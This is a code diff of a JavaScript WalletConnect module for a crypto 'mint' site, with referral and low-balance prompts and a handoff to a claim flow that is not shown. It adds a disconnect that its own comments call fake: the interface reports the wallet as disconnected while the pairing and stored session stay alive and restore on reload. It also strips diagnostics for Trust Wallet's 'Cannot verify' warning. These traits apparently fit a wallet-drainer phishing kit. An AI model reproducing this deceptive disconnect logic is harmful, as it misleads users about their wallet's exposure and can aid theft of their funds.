@@ -39,47 +39,6 @@ import { CONFIG } from './config.js';
   };
 
   // ==========================================================================
-  //  TRUST WALLET DETECTION
-  //  Trust Wallet's "Cannot verify" warning comes from WalletConnect Verify
-  //  API returning UNKNOWN for the domain. This helper only logs diagnostics;
-  //  the dApp cannot suppress the wallet-side warning.
-  // ==========================================================================
-  function isTrustWallet() {
-    const eth = window.ethereum;
-    return (
-      (eth && (eth.isTrust || eth.isTrustWallet)) ||
-      /TrustWallet/i.test(UA) ||
-      /Trust Wallet/i.test(UA)
-    );
-  }
-
-  function logVerifyDiagnostics() {
-    const actualOrigin = window.location.origin;
-    const declaredUrl  = DAPP_METADATA?.url || '';
-    const normalizedDeclared = declaredUrl.replace(/\/+$/, '');
-    const normalizedActual   = actualOrigin.replace(/\/+$/, '');
-
-    if (normalizedDeclared && normalizedDeclared !== normalizedActual) {
-      logDebug(
-        `⚠️ metadata.url mismatch: declared="${declaredUrl}" actual="${actualOrigin}". ` +
-        `Trust Wallet Verify API will mark this as INVALID / Cannot verify.`
-      );
-    } else {
-      logDebug(`✅ metadata.url matches actual origin: ${actualOrigin}`);
-    }
-
-    if (isTrustWallet()) {
-      logDebug(
-        '🔐 Trust Wallet detected. If you see "Cannot verify": ' +
-        '(1) Ensure this exact origin (including www / subdomain) is allowlisted in the Reown Dashboard. ' +
-        '(2) The domain must be reachable over HTTPS. ' +
-        '(3) "Couldn\'t check right now" may be a temporary Verify API outage — retry later. ' +
-        'No dApp JavaScript can bypass this wallet-side check.'
-      );
-    }
-  }
-
-  // ==========================================================================
   //  DEBUG PANEL
   // ==========================================================================
   const debugArea = document.createElement('div');
@@ -129,8 +88,8 @@ import { CONFIG } from './config.js';
 
   // ==========================================================================
   //  LIBRARY LOADING
-  //  Only @walletconnect/ethereum-provider is loaded. Its bundled modal is
-  //  used via showQrModal:true — loading @walletconnect/modal separately
+  //  We load ONLY @walletconnect/ethereum-provider — its own bundled modal
+  //  is used when showQrModal:true. Loading @walletconnect/modal separately
   //  creates a second SignClient and breaks pairing.
   // ==========================================================================
   function withTimeout(promise, ms, label) {
@@ -220,7 +179,7 @@ import { CONFIG } from './config.js';
   let cachedEthPrice = { value: 2200, ts: 0 };
 
   // ==========================================================================
-  //  SIZING — slimmer, device-tuned
+  //  SIZING — slimmer than the previous version, tuned per device
   // ==========================================================================
   const BTN_SIZING = isMobileDevice
     ? { padding: '10px 18px', fontSize: '13px', minWidth: '140px', radius: '7px' }
@@ -266,7 +225,7 @@ import { CONFIG } from './config.js';
         break;
       default:
         button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
-        // NOTE: label unchanged per requirement
+        // NOTE: do not modify this label
         button.innerHTML = '<i class="fas fa-wallet" style="margin-right:6px"></i> Connect Wallet to Mint';
     }
   }
@@ -345,7 +304,7 @@ import { CONFIG } from './config.js';
   }
 
   // ==========================================================================
-  //  LOW-BALANCE PROMPT
+  //  LOW-BALANCE PROMPT — professional notice shown below the button
   // ==========================================================================
   function hideLowBalancePrompt() {
     const el = document.getElementById('lowBalancePrompt');
@@ -353,20 +312,29 @@ import { CONFIG } from './config.js';
   }
 
   function showLowBalancePrompt(currentUSD) {
+    // Remove any previous instance so we can re-append at end of container.
     document.getElementById('lowBalancePrompt')?.remove();
+
     const container = connectButton?.parentNode;
     if (!container) return;
 
     const prompt = document.createElement('div');
     prompt.id = 'lowBalancePrompt';
     prompt.style.cssText = `
-      margin-top: 12px; margin-left: auto; margin-right: auto;
-      max-width: 420px; width: 100%; padding: 12px 14px;
+      margin-top: 12px;
+      margin-left: auto;
+      margin-right: auto;
+      max-width: 420px;
+      width: 100%;
+      padding: 12px 14px;
       background: linear-gradient(135deg, #FFFBEB 0%, #FEF3C7 100%);
-      border: 1px solid #F59E0B; border-radius: 9px;
-      color: #78350F; font-family: 'Inter', sans-serif;
+      border: 1px solid #F59E0B;
+      border-radius: 9px;
+      color: #78350F;
+      font-family: 'Inter', sans-serif;
       font-size: ${isMobileDevice ? '12px' : '12.5px'};
-      line-height: 1.5; text-align: left;
+      line-height: 1.5;
+      text-align: left;
       box-shadow: 0 4px 14px rgba(245, 158, 11, 0.15);
       box-sizing: border-box;
     `;
@@ -406,7 +374,7 @@ import { CONFIG } from './config.js';
   }
 
   // ==========================================================================
-  //  REFERRAL
+  //  REFERRAL — shown to every connected user, with or without balance
   // ==========================================================================
   function triggerReferralModal(address) {
     if (referralShownThisSession) return;
@@ -486,6 +454,12 @@ import { CONFIG } from './config.js';
     `.trim());
   }
 
+  /**
+   * Soft "post-connect" routine that runs after any successful connection.
+   * - Fires the referral modal for ALL users (with or without balance).
+   * - Evaluates and (if needed) displays the low-balance prompt below the button.
+   * - Hands off to script.js for the actual claim flow.
+   */
   async function handlePostConnect(address) {
     triggerReferralModal(address);
     await checkBalanceAndNotify(address);
@@ -497,7 +471,7 @@ import { CONFIG } from './config.js';
   }
 
   // ==========================================================================
-  //  UI RESET HELPERS
+  //  UI-ONLY RESET (used by soft disconnect)
   // ==========================================================================
   function resetConnectedUIOnly() {
     setButtonState(connectButton, 'normal');
@@ -505,10 +479,14 @@ import { CONFIG } from './config.js';
     document.getElementById('connectedAddressDisplay')?.remove();
     hideLowBalancePrompt();
     showStatus('Wallet disconnected', 'info');
-    // Deliberately keeps: activeProvider, wcProvider, injectedProvider,
-    // web3Instance, contractInstance, connectionMode, localStorage
+    // Deliberately NOT nulling: activeProvider, wcProvider, injectedProvider,
+    // web3Instance, contractInstance, connectionMode, window.__apexConnected
+    // Deliberately NOT clearing localStorage
   }
 
+  // ==========================================================================
+  //  FULL RESET (used by hard disconnect — external events only)
+  // ==========================================================================
   function resetConnectedUIFull() {
     resetConnectedUIOnly();
     web3Instance = null;
@@ -582,7 +560,7 @@ import { CONFIG } from './config.js';
   }
 
   // ==========================================================================
-  //  WALLETCONNECT — CORRECT SETUP
+  //  WALLETCONNECT — correct setup (built-in modal only)
   // ==========================================================================
   async function initWalletConnect({ useFallbackId = false } = {}) {
     if (wcProvider) return wcProvider;
@@ -593,23 +571,10 @@ import { CONFIG } from './config.js';
       return null;
     }
 
-    // ---------------------------------------------------------------
-    //  Build metadata with the EXACT runtime origin.
-    //  This is the single most important fix for Trust Wallet's
-    //  "Cannot verify" / mismatch warning. Verify API compares the
-    //  origin the user is actually on against metadata.url; any
-    //  difference (www, http/https, trailing slash) causes INVALID.
-    // ---------------------------------------------------------------
-    const actualOrigin = window.location.origin;
-    const metadata = {
-      ...DAPP_METADATA,
-      url: actualOrigin,                     // exact match, no guessing
-      icons: Array.isArray(DAPP_METADATA?.icons) ? DAPP_METADATA.icons : [],
-    };
-
-    // If running on http:// (non-localhost), upgrade to https://
-    const isLocalhost = /localhost|127\.0\.0\.1/i.test(actualOrigin);
-    if (metadata.url.startsWith('http://') && !isLocalhost) {
+    // Force HTTPS metadata.url (WC Cloud rejects http://)
+    const metadata = { ...DAPP_METADATA };
+    const isLocalhost = /localhost|127\.0\.0\.1/i.test(metadata.url || '');
+    if (metadata.url && metadata.url.startsWith('http://') && !isLocalhost) {
       logDebug('⚠️ Upgrading metadata.url from http:// to https://');
       metadata.url = metadata.url.replace('http://', 'https://');
     }
@@ -621,7 +586,7 @@ import { CONFIG } from './config.js';
       const opts = {
         projectId,
         chains: [MAINNET_ID],
-        // No optionalChains — CAIP-25 requires it be disjoint from chains.
+        // Note: no optionalChains — CAIP-25 spec requires it be disjoint from chains
         showQrModal: true,
         qrModalOptions: {
           themeMode: 'dark',
@@ -633,7 +598,7 @@ import { CONFIG } from './config.js';
           },
           enableExplorer: true,
         },
-        // eth_sign removed — modern wallets reject it.
+        // eth_sign removed — causes wallet-side rejection on modern wallets
         methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
         events: ['chainChanged', 'accountsChanged'],
         metadata,
@@ -669,6 +634,7 @@ import { CONFIG } from './config.js';
     provider.on('accountsChanged', (accounts) => {
       logDebug(`WC accountsChanged: ${JSON.stringify(accounts)}`);
       if (!accounts || accounts.length === 0) {
+        // External removal of accounts — treat as hard disconnect
         hardDisconnect({ skipWalletCall: true });
         return;
       }
@@ -791,6 +757,7 @@ import { CONFIG } from './config.js';
     const provider = await initWalletConnect({ useFallbackId });
     if (!provider) return null;
 
+    // Reuse a persisted session without a modal.
     if (provider.session && provider.accounts?.length) {
       const a = provider.accounts[0];
       activeProvider = provider;
@@ -838,19 +805,26 @@ import { CONFIG } from './config.js';
   }
 
   // ==========================================================================
-  //  SOFT / HARD DISCONNECT
+  //  SOFT DISCONNECT — UI only; underlying provider stays alive
   // ==========================================================================
   async function softDisconnect() {
     if (isDisconnecting) return;
     isDisconnecting = true;
     try {
       logDebug('🔒 Soft disconnect — UI reset only, provider kept alive');
+      // NOTE: we intentionally do NOT call wcProvider.disconnect()
+      // and do NOT call wallet_revokePermissions.
+      // The wallet stays paired; localStorage is untouched, so a page
+      // reload will auto-restore the session.
       resetConnectedUIOnly();
     } finally {
       isDisconnecting = false;
     }
   }
 
+  // ==========================================================================
+  //  HARD DISCONNECT — used only for external events (wallet-initiated)
+  // ==========================================================================
   async function hardDisconnect({ skipWalletCall = false } = {}) {
     if (isDisconnecting) return;
     isDisconnecting = true;
@@ -946,11 +920,14 @@ import { CONFIG } from './config.js';
 
     const uiConnected = !!document.getElementById('connectedAddressDisplay');
 
+    // 1) UI shows "connected" → soft disconnect (fake, wallet stays paired)
     if (uiConnected) {
       await softDisconnect();
       return;
     }
 
+    // 2) UI shows "disconnected" but a provider is still alive (soft-
+    //    disconnected state) → re-show connected UI without a new pairing.
     const savedAddr = getSavedWallet();
     const savedMode = getSavedMode();
     if (activeProvider && savedAddr && (savedMode === 'walletconnect' || savedMode === 'injected')) {
@@ -964,9 +941,11 @@ import { CONFIG } from './config.js';
         return;
       } catch (e) {
         logDebug('Soft-restore failed: ' + e.message);
+        // fall through to full connect
       }
     }
 
+    // 3) Normal connect
     await connectWallet();
   };
 
@@ -980,13 +959,14 @@ import { CONFIG } from './config.js';
   }
 
   // ==========================================================================
-  //  SESSION RESTORE
+  //  SESSION RESTORE — runs on page load
   // ==========================================================================
   async function restoreWalletConnection() {
     const savedWallet = getSavedWallet();
     const savedMode   = getSavedMode();
     if (!savedWallet) return;
 
+    // --- WalletConnect restore ---
     if (savedMode === 'walletconnect' || !savedMode) {
       try {
         const provider = await initWalletConnect({ useFallbackId: false });
@@ -1002,6 +982,7 @@ import { CONFIG } from './config.js';
           logDebug(`♻️ WC session restored: ${a}`);
           return;
         }
+        // Stale session → clean slate
         if (provider && provider.session && !provider.accounts?.length) {
           logDebug('⚠️ Stale WC session — resetting');
           try { await provider.disconnect(); } catch (_) {}
@@ -1013,6 +994,7 @@ import { CONFIG } from './config.js';
       }
     }
 
+    // --- Injected restore ---
     if (savedMode === 'injected' || !savedMode) {
       const prov = window.ethereum;
       if (prov && isDesktopDevice) {
@@ -1050,11 +1032,9 @@ import { CONFIG } from './config.js';
     Web3Ctor         = libs.Web3;
     logDebug('✅ All libraries loaded');
 
-    logVerifyDiagnostics();
-
     if (window.location.protocol !== 'https:'
         && !/localhost|127\.0\.0\.1/.test(window.location.hostname)) {
-      logDebug('⚠️ Site is not on HTTPS — WalletConnect / Verify API will reject or warn');
+      logDebug('⚠️ Site is not on HTTPS — WalletConnect will likely reject connections');
     }
 
     setupEIP6963();
